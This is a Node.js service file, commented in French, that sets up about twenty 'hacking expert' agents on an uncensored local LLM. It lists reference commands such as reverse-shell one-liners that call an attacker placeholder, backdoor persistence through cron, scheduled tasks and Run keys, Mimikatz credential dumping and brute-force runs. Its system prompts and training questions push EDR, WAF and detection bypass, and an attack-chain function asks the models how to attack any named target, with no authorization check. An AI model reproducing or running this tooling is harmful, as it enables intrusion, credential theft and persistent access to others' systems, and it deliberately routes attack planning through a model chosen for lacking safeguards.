/**
 * Hacking Expert Agents Service
 * Agents spécialisés par outil/technique de hacking avec entraînement continu
 * Chaque agent devient EXPERT de son outil/technique spécifique
 * ENVIRONNEMENT: Kali Linux 2024.1
 */

const fs = require('fs');
const path = require('path');
const KALI_ENVIRONMENT = require('./config/kali_environment');

class HackingExpertAgentsService {
    constructor() {
        this.ollamaUrl = process.env.OLLAMA_URL || 'http://localhost:11434';
        this.dataPath = path.join(__dirname, 'data', 'hacking_experts');
        this.model = 'uandinotai/dolphin-uncensored:latest';
        this.fallbackModel = 'uandinotai/dolphin-uncensored:latest';
        this.kaliEnv = KALI_ENVIRONMENT;
        
        this.ensureDataFolder();
        this.initializeAgents();
        
        console.log(`[HACKING-EXPERTS] Service initialized with ${Object.keys(this.agents).length} tool experts on ${this.kaliEnv.os}`);
    }

    ensureDataFolder() {
        if (!fs.existsSync(this.dataPath)) {
            fs.mkdirSync(this.dataPath, { recursive: true });
        }
    }

    /**
     * Configuration de tous les agents experts hacking par outil/technique
     */
    getHackingToolConfigs() {
        return {
            // ==========================================
            // RECONNAISSANCE & SCANNING
            // ==========================================
            nmap: {
                name: 'Nmap Expert',
                emoji: '🔬',
                category: 'Reconnaissance',
                tool: 'Nmap',
                description: 'Expert en scanning réseau, découverte de ports et services',
                commands: [
                    'nmap -sS -sV -O target',
                    'nmap -sn 192.168.1.0/24',
                    'nmap -p- -T4 target',
                    'nmap --script vuln target',
                    'nmap -sU -sS -p U:53,T:80,443 target'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Nmap.
EXPERTISE: Scanning, découverte réseau, fingerprinting, NSE scripts
SCAN TYPES: -sS (SYN), -sT (Connect), -sU (UDP), -sN (Null), -sX (Xmas)
OPTIONS: -O (OS), -sV (version), -A (aggressive), -T0-5 (timing)
SCRIPTS: vuln, http-*, smb-*, ftp-*, ssh-*, ssl-*
ÉVASION: --spoof-mac, -D, -S, --data-length, -f
DÉFENSE: Comment détecter chaque type de scan, IDS/IPS bypass`
            },

            masscan: {
                name: 'Masscan Expert',
                emoji: '⚡',
                category: 'Reconnaissance',
                tool: 'Masscan',
                description: 'Expert en scan ultra-rapide Internet-scale',
                commands: [
                    'masscan -p80,443 10.0.0.0/8 --rate 10000',
                    'masscan -p0-65535 target --rate 1000',
                    'masscan --banners -p80 target'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Masscan.
EXPERTISE: Scanning Internet-scale, 10M paquets/sec
OPTIONS: --rate, --banners, --excludefile
OUTPUT: -oL (list), -oX (XML), -oG (grepable), -oJ (JSON)
TUNING: SYN cookies, adapter la rate, gérer congestion
DÉFENSE: Rate limiting, firewall rules, traffic analysis`
            },

            // ==========================================
            // EXPLOITATION
            // ==========================================
            metasploit: {
                name: 'Metasploit Expert',
                emoji: '💉',
                category: 'Exploitation',
                tool: 'Metasploit Framework',
                description: 'Expert en exploitation automatisée et payloads',
                commands: [
                    'use exploit/windows/smb/ms17_010_eternalblue',
                    'set RHOSTS target; set PAYLOAD windows/x64/meterpreter/reverse_tcp',
                    'exploit -j',
                    'search type:exploit platform:windows',
                    'sessions -i 1'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Metasploit Framework.
EXPERTISE: Exploits, payloads, post-exploitation, pivoting
MODULES: exploit/, auxiliary/, post/, payload/, encoder/
METERPRETER: getsystem, hashdump, migrate, portfwd, route
PAYLOADS: reverse_tcp, bind_tcp, meterpreter, shell
ÉVASION: Encoders, templates, custom payloads
DÉFENSE: Détection signatures, behavioral analysis, EDR bypass`
            },

            sqlmap: {
                name: 'SQLMap Expert',
                emoji: '💾',
                category: 'Web Exploitation',
                tool: 'SQLMap',
                description: 'Expert en injection SQL automatisée',
                commands: [
                    'sqlmap -u "http://target/page?id=1" --dbs',
                    'sqlmap -u "url" -D database -T table --dump',
                    'sqlmap -r request.txt --level 5 --risk 3',
                    'sqlmap --os-shell',
                    'sqlmap --tamper=space2comment,between'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de SQLMap.
EXPERTISE: SQLi detection/exploitation, database takeover
TECHNIQUES: UNION, blind, error-based, stacked, time-based
OPTIONS: --dbs, --tables, --columns, --dump, --os-shell
TAMPER SCRIPTS: space2comment, between, randomcase, charencode
ÉVASION: WAF bypass, encoding, time delays
DÉFENSE: Parameterized queries, WAF rules, input validation`
            },

            burpsuite: {
                name: 'Burp Suite Expert',
                emoji: '🔧',
                category: 'Web Security',
                tool: 'Burp Suite',
                description: 'Expert en test de sécurité web',
                commands: [
                    'Burp: Proxy > Intercept > Forward/Drop',
                    'Burp: Repeater > Modify and resend',
                    'Burp: Intruder > Positions > Payloads',
                    'Burp: Scanner > Active scan',
                    'Burp: Extensions > BApp Store'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Burp Suite.
EXPERTISE: Proxy, scanner, intruder, repeater, sequencer
PROXY: Interception, modification, history, match/replace
INTRUDER: Sniper, battering ram, pitchfork, cluster bomb
EXTENSIONS: SQLiPy, ActiveScan++, Autorize, Logger++
DÉFENSE: Identifier les scans Burp, WAF tuning`
            },

            // ==========================================
            // PASSWORD ATTACKS
            // ==========================================
            hydra: {
                name: 'Hydra Expert',
                emoji: '🐉',
                category: 'Password Attacks',
                tool: 'THC Hydra',
                description: 'Expert en brute-force de services réseau',
                commands: [
                    'hydra -l admin -P wordlist.txt ssh://target',
                    'hydra -L users.txt -P pass.txt ftp://target',
                    'hydra -l user -P pass.txt http-post-form "url:user=^USER^&pass=^PASS^:failed"',
                    'hydra -C creds.txt rdp://target'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de THC Hydra.
EXPERTISE: Brute-force SSH, FTP, HTTP, RDP, SMB, MySQL, etc.
SERVICES: ssh, ftp, http-get, http-post-form, rdp, smb, mysql, vnc
OPTIONS: -l/-L user, -p/-P pass, -C combo, -t threads, -f stop
WORDLISTS: rockyou, SecLists, custom generation
DÉFENSE: Fail2ban, account lockout, rate limiting, MFA`
            },

            hashcat: {
                name: 'Hashcat Expert',
                emoji: '🔓',
                category: 'Password Cracking',
                tool: 'Hashcat',
                description: 'Expert en cracking GPU de hashes',
                commands: [
                    'hashcat -m 0 hash.txt wordlist.txt',
                    'hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule',
                    'hashcat -m 2500 wifi.hccapx wordlist.txt',
                    'hashcat -a 3 hash.txt ?a?a?a?a?a?a'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Hashcat.
EXPERTISE: GPU cracking, modes d'attaque, règles
MODES: -m 0 MD5, -m 100 SHA1, -m 1000 NTLM, -m 1800 SHA512crypt
ATTACKS: -a 0 straight, -a 3 brute-force, -a 6/7 hybrid
RULES: best64, dive, OneRuleToRuleThemAll
MASKS: ?l lower, ?u upper, ?d digit, ?s special, ?a all
DÉFENSE: Bcrypt/Argon2, key stretching, salting`
            },

            johntheripper: {
                name: 'John the Ripper Expert',
                emoji: '🗝️',
                category: 'Password Cracking',
                tool: 'John the Ripper',
                description: 'Expert en cracking CPU multi-format',
                commands: [
                    'john --wordlist=rockyou.txt hashes.txt',
                    'john --format=raw-md5 hash.txt',
                    'unshadow /etc/passwd /etc/shadow > unshadow.txt',
                    'john --rules --wordlist=dict.txt target'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de John the Ripper.
EXPERTISE: CPU cracking, auto-format detection, règles
FORMATS: Raw-MD5, SHA512, bcrypt, descrypt, LM, NTLM
MODES: Single crack, wordlist, incremental, external
RÈGLES: Jumbo, KoreLogic, custom mangling rules
DÉFENSE: Strong hashing (bcrypt, Argon2), password policies`
            },

            // ==========================================
            // NETWORK ATTACKS
            // ==========================================
            wireshark: {
                name: 'Wireshark Expert',
                emoji: '🦈',
                category: 'Network Analysis',
                tool: 'Wireshark/Tshark',
                description: 'Expert en analyse de paquets et protocoles',
                commands: [
                    'tshark -i eth0 -w capture.pcap',
                    'tshark -r file.pcap -Y "http.request"',
                    'wireshark: Follow TCP Stream',
                    'tshark -T fields -e http.host -e http.request.uri'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Wireshark/Tshark.
EXPERTISE: Capture, analyse, filtres, protocoles
FILTRES: ip.addr, tcp.port, http, dns, frame.len
ANALYSES: Follow stream, statistics, expert info
DÉCAPSULATION: SSL/TLS decrypt avec clés
DÉFENSE: Détecter anomalies, traffic patterns suspects`
            },

            responder: {
                name: 'Responder Expert',
                emoji: '📡',
                category: 'Network Attacks',
                tool: 'Responder/LLMNR',
                description: 'Expert en poisoning LLMNR/NBT-NS',
                commands: [
                    'responder -I eth0 -wrf',
                    'responder -I eth0 -Pdv',
                    'ntlmrelayx.py -tf targets.txt -smb2support'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Responder.
EXPERTISE: LLMNR/NBT-NS poisoning, relay attacks, hash capture
OPTIONS: -w WPAD, -r WREDIR, -f fingerprint
INTÉGRATION: ntlmrelayx, MultiRelay, SMBrelayx
ATTACKS: Credential capture, SMB relay, WPAD abuse
DÉFENSE: Disable LLMNR/NBT-NS, SMB signing, segmentation`
            },

            mitmproxy: {
                name: 'MITM Expert',
                emoji: '🕵️',
                category: 'Network Attacks',
                tool: 'mitmproxy/Ettercap',
                description: 'Expert en attaques Man-in-the-Middle',
                commands: [
                    'mitmproxy -p 8080',
                    'mitmweb',
                    'ettercap -T -M arp:remote /gateway/ /target/',
                    'bettercap -iface eth0'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU des attaques MITM.
EXPERTISE: ARP spoofing, SSL stripping, traffic interception
OUTILS: mitmproxy, Ettercap, Bettercap, sslstrip
TECHNIQUES: ARP cache poisoning, DHCP spoofing, DNS spoofing
DÉFENSE: ARP inspection, HTTPS everywhere, certificate pinning`
            },

            // ==========================================
            // SHELLS & PERSISTENCE
            // ==========================================
            reverseshells: {
                name: 'Reverse Shell Expert',
                emoji: '🐚',
                category: 'Shells',
                tool: 'Reverse Shells',
                description: 'Expert en shells reverse et bind',
                commands: [
                    'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1',
                    'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
                    'nc -e /bin/sh ATTACKER PORT',
                    'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'IP\',PORT)..."'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU des Reverse Shells.
EXPERTISE: Bash, Python, PHP, PowerShell, Netcat, Socat
ONELINER: bash, python, php, ruby, perl, nc, socat, powershell
UPGRADE: pty spawn, stty raw, script /dev/null
OBFUSCATION: Base64, alternate data streams, living off the land
DÉFENSE: Egress filtering, network monitoring, YARA rules`
            },

            persistence: {
                name: 'Persistence Expert',
                emoji: '🔗',
                category: 'Post-Exploitation',
                tool: 'Persistence Techniques',
                description: 'Expert en maintien d\'accès',
                commands: [
                    'crontab -e: @reboot /path/to/backdoor',
                    'Windows: schtasks /create /tn "Update" /tr backdoor.exe',
                    'Registry Run keys: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'systemctl enable malicious.service'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU des techniques de Persistence.
EXPERTISE: Cron, scheduled tasks, registry, services, WMI
LINUX: cron, bashrc, systemd, init.d, LD_PRELOAD
WINDOWS: Run keys, services, WMI, DLL hijacking, COM objects
FILELESS: Memory-only, registry, PowerShell profiles
DÉFENSE: Autoruns analysis, EDR, integrity monitoring`
            },

            // ==========================================
            // PRIVILEGE ESCALATION
            // ==========================================
            privesc_linux: {
                name: 'Linux PrivEsc Expert',
                emoji: '🐧',
                category: 'Privilege Escalation',
                tool: 'Linux PrivEsc',
                description: 'Expert en élévation de privilèges Linux',
                commands: [
                    'sudo -l',
                    'find / -perm -4000 2>/dev/null',
                    'cat /etc/crontab',
                    'getcap -r / 2>/dev/null',
                    'linpeas.sh'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Linux Privilege Escalation.
EXPERTISE: SUID, sudo, cron, capabilities, kernel exploits
ENUMERATION: linpeas, LinEnum, linux-exploit-suggester
TECHNIQUES: SUID abuse, sudo misconfig, cron exploitation
KERNEL: dirty cow, dirty pipe, overlayfs
DÉFENSE: Least privilege, sudo audit, kernel updates`
            },

            privesc_windows: {
                name: 'Windows PrivEsc Expert',
                emoji: '🪟',
                category: 'Privilege Escalation',
                tool: 'Windows PrivEsc',
                description: 'Expert en élévation de privilèges Windows',
                commands: [
                    'whoami /priv',
                    'systeminfo | findstr /B /C:"OS"',
                    'wmic service get name,pathname',
                    'winPEAS.exe',
                    'PowerUp.ps1: Invoke-AllChecks'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Windows Privilege Escalation.
EXPERTISE: Unquoted paths, service misconfigs, token impersonation
ENUMERATION: winPEAS, PowerUp, Seatbelt, SharpUp
TECHNIQUES: SeImpersonatePrivilege, DLL hijacking, AlwaysInstallElevated
EXPLOITS: PrintSpoofer, GodPotato, JuicyPotato
DÉFENSE: UAC, AppLocker, credential guard, LAPS`
            },

            // ==========================================
            // WIRELESS
            // ==========================================
            aircrack: {
                name: 'Aircrack-ng Expert',
                emoji: '📶',
                category: 'Wireless',
                tool: 'Aircrack-ng Suite',
                description: 'Expert en attaques WiFi',
                commands: [
                    'airmon-ng start wlan0',
                    'airodump-ng wlan0mon',
                    'airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon',
                    'aireplay-ng -0 5 -a BSSID wlan0mon',
                    'aircrack-ng -w wordlist.txt capture-01.cap'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Aircrack-ng.
EXPERTISE: WEP/WPA cracking, packet injection, deauth
SUITE: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng
ATTAQUES: Deauth, fake auth, chopchop, fragmentation
WPA: Handshake capture, PMKID, dictionary attack
DÉFENSE: WPA3, strong passwords, client isolation, IDS`
            },

            // ==========================================
            // ACTIVE DIRECTORY
            // ==========================================
            bloodhound: {
                name: 'BloodHound Expert',
                emoji: '🩸',
                category: 'Active Directory',
                tool: 'BloodHound',
                description: 'Expert en cartographie AD et chemins d\'attaque',
                commands: [
                    'bloodhound-python -d domain.local -u user -p pass -c All',
                    'SharpHound.exe -c All',
                    'BloodHound: Find Shortest Path to Domain Admin',
                    'BloodHound: Find Kerberoastable Users'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de BloodHound.
EXPERTISE: AD enumeration, attack paths, permissions analysis
COLLECTORS: SharpHound, bloodhound-python, AzureHound
QUERIES: Path to DA, Kerberoast, ASREPRoast, DCSync
EDGES: MemberOf, HasSession, AdminTo, CanRDP, GenericAll
DÉFENSE: Tiered model, least privilege, monitoring`
            },

            impacket: {
                name: 'Impacket Expert',
                emoji: '📦',
                category: 'Active Directory',
                tool: 'Impacket',
                description: 'Expert en outils réseau Python AD',
                commands: [
                    'psexec.py domain/user:pass@target',
                    'secretsdump.py domain/user:pass@dc',
                    'GetUserSPNs.py -request domain/user:pass',
                    'ntlmrelayx.py -tf targets.txt'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Impacket.
EXPERTISE: SMB, Kerberos, NTLM, lateral movement, credential dumping
SCRIPTS: psexec, secretsdump, GetUserSPNs, wmiexec, smbexec
ATTACKS: Pass-the-hash, Kerberoasting, DCSync, relay
DÉFENSE: SMB signing, credential guard, segmentation`
            },

            mimikatz: {
                name: 'Mimikatz Expert',
                emoji: '🎭',
                category: 'Credential Attacks',
                tool: 'Mimikatz',
                description: 'Expert en extraction de credentials Windows',
                commands: [
                    'sekurlsa::logonpasswords',
                    'lsadump::dcsync /user:Administrator',
                    'kerberos::golden /user:Admin /domain:domain /sid:S-1-5...',
                    'privilege::debug; sekurlsa::wdigest'
                ],
                systemPrompt: `Tu es un EXPERT ABSOLU de Mimikatz.
EXPERTISE: LSASS dump, DCSync, Golden/Silver tickets, PTH
MODULES: sekurlsa, lsadump, kerberos, crypto, vault
ATTACKS: Pass-the-hash, overpass-the-hash, ticket attacks
DÉFENSE: Credential Guard, Protected Users, LSA protection`
            }
        };
    }

    /**
     * Initialiser tous les agents
     */
    initializeAgents() {
        this.agents = {};
        const configs = this.getHackingToolConfigs();
        
        for (const [id, config] of Object.entries(configs)) {
            const knowledgePath = path.join(this.dataPath, `${id}_knowledge.json`);
            let knowledge = { 
                interactions: 0, 
                techniques: [],
                codeSnippets: [],
                successfulExploits: [],
                defenseStrategies: [],
                trainingHistory: []
            };
            
            if (fs.existsSync(knowledgePath)) {
                knowledge = JSON.parse(fs.readFileSync(knowledgePath, 'utf8'));
            }
            
            this.agents[id] = { ...config, knowledge, knowledgePath };
        }
    }

    saveAgentKnowledge(agentId) {
        const agent = this.agents[agentId];
        if (!agent) return;
        fs.writeFileSync(agent.knowledgePath, JSON.stringify(agent.knowledge, null, 2));
    }

    /**
     * Consulter un expert hacking spécifique
     */
    async consultExpert(agentId, question, context = '') {
        const agent = this.agents[agentId];
        if (!agent) throw new Error(`Hacking Expert "${agentId}" not found`);

        console.log(`[HACKING-EXPERTS] ${agent.emoji} ${agent.name} analyzing...`);

        // Construire le contexte avec les connaissances apprises
        let learnedContext = '';
        if (agent.knowledge.techniques.length > 0) {
            learnedContext = '\n\nTECHNIQUES APPRISES:\n' + 
                agent.knowledge.techniques.slice(-10).map(t => `- ${t.content}`).join('\n');
        }
        if (agent.knowledge.codeSnippets.length > 0) {
            learnedContext += '\n\nCODE SNIPPETS MÉMORISÉS:\n' + 
                agent.knowledge.codeSnippets.slice(-5).map(c => `\`\`\`\n${c.code}\n\`\`\``).join('\n');
        }

        const fullPrompt = `${this.kaliEnv.getSystemPrompt()}
${agent.systemPrompt}

OUTIL: ${agent.tool}
COMMANDES DE RÉFÉRENCE:
${agent.commands.map(c => `- ${c}`).join('\n')}
${learnedContext}

${context}

QUESTION/TÂCHE: ${question}

Réponds en EXPERT ${agent.tool} sur Kali Linux. Donne:
1. La commande/technique exacte (compatible Kali Linux)
2. Explication technique détaillée
3. Comment le défenseur peut détecter/bloquer
4. Code si applicable`;

        try {
            const response = await fetch(`${this.ollamaUrl}/api/generate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    model: this.model,
                    prompt: fullPrompt,
                    stream: false,
                    options: { temperature: 0.4, num_predict: 2500 }
                })
            });

            if (!response.ok) {
                // Fallback
                const fallbackResponse = await fetch(`${this.ollamaUrl}/api/generate`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        model: this.fallbackModel,
                        prompt: fullPrompt,
                        stream: false,
                        options: { temperature: 0.4, num_predict: 2500 }
                    })
                });
                const data = await fallbackResponse.json();
                return this.processResponse(agent, agentId, question, data.response, this.fallbackModel);
            }

            const data = await response.json();
            return this.processResponse(agent, agentId, question, data.response, this.model);

        } catch (error) {
            console.error(`[HACKING-EXPERTS] ${agent.name} error:`, error.message);
            throw error;
        }
    }

    processResponse(agent, agentId, question, response, modelUsed) {
        agent.knowledge.interactions++;
        
        // Track la question dans l'historique d'entraînement
        agent.knowledge.trainingHistory.push({
            question: question.substring(0, 100),
            timestamp: new Date().toISOString()
        });
        
        if (agent.knowledge.trainingHistory.length > 100) {
            agent.knowledge.trainingHistory = agent.knowledge.trainingHistory.slice(-100);
        }
        
        this.saveAgentKnowledge(agentId);

        return {
            expert: agent.name,
            emoji: agent.emoji,
            tool: agent.tool,
            category: agent.category,
            model: modelUsed,
            response: response,
            stats: {
                interactions: agent.knowledge.interactions,
                techniques: agent.knowledge.techniques.length,
                codeSnippets: agent.knowledge.codeSnippets.length,
                exploits: agent.knowledge.successfulExploits.length
            }
        };
    }

    /**
     * Enseigner une nouvelle technique avec code
     */
    teachTechnique(agentId, technique, code = null, successful = true) {
        const agent = this.agents[agentId];
        if (!agent) return false;

        agent.knowledge.techniques.push({
            content: technique,
            timestamp: new Date().toISOString(),
            successful
        });

        if (code) {
            agent.knowledge.codeSnippets.push({
                code: code,
                description: technique.substring(0, 50),
                timestamp: new Date().toISOString()
            });
        }

        if (successful) {
            agent.knowledge.successfulExploits.push(technique);
        }

        // Limiter la taille
        if (agent.knowledge.techniques.length > 100) {
            agent.knowledge.techniques = agent.knowledge.techniques.slice(-100);
        }
        if (agent.knowledge.codeSnippets.length > 50) {
            agent.knowledge.codeSnippets = agent.knowledge.codeSnippets.slice(-50);
        }
        if (agent.knowledge.successfulExploits.length > 50) {
            agent.knowledge.successfulExploits = agent.knowledge.successfulExploits.slice(-50);
        }

        this.saveAgentKnowledge(agentId);
        console.log(`[HACKING-EXPERTS] ${agent.emoji} ${agent.name} learned: ${technique.substring(0, 50)}...`);
        return true;
    }

    /**
     * Enseigner une stratégie de défense
     */
    teachDefense(agentId, defenseStrategy) {
        const agent = this.agents[agentId];
        if (!agent) return false;

        agent.knowledge.defenseStrategies.push({
            strategy: defenseStrategy,
            timestamp: new Date().toISOString()
        });

        if (agent.knowledge.defenseStrategies.length > 50) {
            agent.knowledge.defenseStrategies = agent.knowledge.defenseStrategies.slice(-50);
        }

        this.saveAgentKnowledge(agentId);
        return true;
    }

    /**
     * Entraînement continu sur un sujet
     */
    async continuousTraining(agentId, topic, iterations = 3) {
        const agent = this.agents[agentId];
        if (!agent) throw new Error(`Agent ${agentId} not found`);

        console.log(`[HACKING-EXPERTS] ${agent.emoji} Starting continuous training on "${topic}" (${iterations} iterations)`);

        const trainingQuestions = [
            `Explique la technique de base de ${topic} avec ${agent.tool}`,
            `Quelles sont les variantes avancées de ${topic}?`,
            `Comment contourner les défenses modernes pour ${topic}?`,
            `Quel code/script utiliser pour automatiser ${topic}?`,
            `Comment un défenseur détecte ${topic}? Comment l'éviter?`
        ];

        const results = [];
        const selectedQuestions = trainingQuestions.slice(0, iterations);

        for (const question of selectedQuestions) {
            try {
                const result = await this.consultExpert(agentId, question);
                results.push(result);
                
                // Auto-teach from the response
                this.teachTechnique(agentId, `Topic: ${topic} - ${question.substring(0, 50)}`, null, true);
                
                // Petit délai pour éviter surcharge
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (error) {
                results.push({ error: error.message });
            }
        }

        return {
            agent: agent.name,
            topic,
            iterations: results.length,
            results,
            newKnowledge: agent.knowledge.techniques.length
        };
    }

    /**
     * Attack chain - combiner plusieurs experts pour une attaque complète
     */
    async attackChain(target, phases = ['recon', 'exploit', 'persist']) {
        console.log(`[HACKING-EXPERTS] Attack chain simulation for: ${target}`);

        const phaseExperts = {
            recon: ['nmap', 'masscan'],
            exploit: ['metasploit', 'sqlmap', 'burpsuite'],
            persist: ['reverseshells', 'persistence'],
            privesc: ['privesc_linux', 'privesc_windows'],
            lateral: ['impacket', 'mimikatz', 'bloodhound'],
            wireless: ['aircrack']
        };

        const results = [];
        for (const phase of phases) {
            const experts = phaseExperts[phase] || ['nmap'];
            const phaseResults = [];

            for (const expertId of experts) {
                if (this.agents[expertId]) {
                    try {
                        const question = `Phase ${phase}: Comment attaquer "${target}"?`;
                        const result = await this.consultExpert(expertId, question);
                        phaseResults.push(result);
                    } catch (error) {
                        phaseResults.push({ expert: expertId, error: error.message });
                    }
                }
            }

            results.push({ phase, experts: phaseResults });
        }

        return { target, phases, results };
    }

    /**
     * Obtenir les stats de tous les experts
     */
    getExpertsStats() {
        return Object.entries(this.agents).map(([id, agent]) => ({
            id,
            name: agent.name,
            emoji: agent.emoji,
            tool: agent.tool,
            category: agent.category,
            interactions: agent.knowledge.interactions,
            techniques: agent.knowledge.techniques.length,
            codeSnippets: agent.knowledge.codeSnippets.length,
            exploits: agent.knowledge.successfulExploits.length
        })).sort((a, b) => b.interactions - a.interactions);
    }

    /**
     * Lister les experts par catégorie
     */
    getExpertsByCategory() {
        const categories = {};
        for (const [id, agent] of Object.entries(this.agents)) {
            if (!categories[agent.category]) {
                categories[agent.category] = [];
            }
            categories[agent.category].push({
                id,
                name: agent.name,
                emoji: agent.emoji,
                tool: agent.tool
            });
        }
        return categories;
    }
}

module.exports = HackingExpertAgentsService;
